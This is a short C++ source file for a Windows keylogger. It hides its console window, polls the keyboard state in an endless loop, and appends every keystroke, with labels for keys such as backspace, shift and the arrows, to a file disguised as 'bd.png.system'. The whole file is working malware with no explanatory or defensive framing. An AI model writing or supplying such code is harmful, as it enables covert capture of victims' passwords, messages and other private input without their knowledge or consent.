
#include <iostream>
using namespace std;
#include <Windows.h>
#include <WinUser.h>

int Save (int key, char *file);
void Hide();

int main()
{
    Hide();
	char i;
	while(true)
	{
		for(i = 8; i <= 190; i++)
		{
			if( GetAsyncKeyState(i) == -32767)
				Save(i, "bd.png.system");
		}
	}
	system ("PAUSE");
	return 0;
}


//IMPL

int Save (int key, char *file){
  
    if(key == 1 || key == 2)
           return 0;
  
    FILE *OUT_FILE;
    OUT_FILE = fopen(file, "a+");
    
    if(key == 8)
        fprintf(OUT_FILE, "%s", "[BACKSPACE]");
    else if(key == 13)
        fprintf(OUT_FILE, "%s", "\n");
    else if(key == 32)
        fprintf(OUT_FILE, "%s", " ");
    else if(key == VK_TAB)
        fprintf(OUT_FILE, "%s", "[TAB]");
    else if(key == VK_SHIFT)
        fprintf(OUT_FILE, "%s", "[SHIFT]");
    else if(key == VK_CONTROL)
        fprintf(OUT_FILE, "%s", "[CONTROL]");
    else if(key == VK_ESCAPE)
        fprintf(OUT_FILE, "%s", "[ESCAPE]");
    else if(key == VK_END)
        fprintf(OUT_FILE, "%s", "[END]");
    else if(key == VK_HOME)
        fprintf(OUT_FILE, "%s", "[HOME]");
    else if(key == VK_LEFT)
        fprintf(OUT_FILE, "%s", "[LEFT]");
    else if(key == VK_UP)
        fprintf(OUT_FILE, "%s", "[UP]"); 
    else if(key == VK_RIGHT)
        fprintf(OUT_FILE, "%s", "[RIGHT]");        
    else if(key == VK_DOWN)
        fprintf(OUT_FILE, "%s", "[DOWN]");
    else if(key == 190 || key == 110)
        fprintf(OUT_FILE, "%s", ".");
    else
        fprintf(OUT_FILE,"%s", &key);                    
    fclose(OUT_FILE);
	 
	return 0;
}

void Hide()
{
   HWND stealth;
   AllocConsole();
   stealth = FindWindowA("ConsoleWindowClass",NULL);
   ShowWindow(stealth,0);     
}
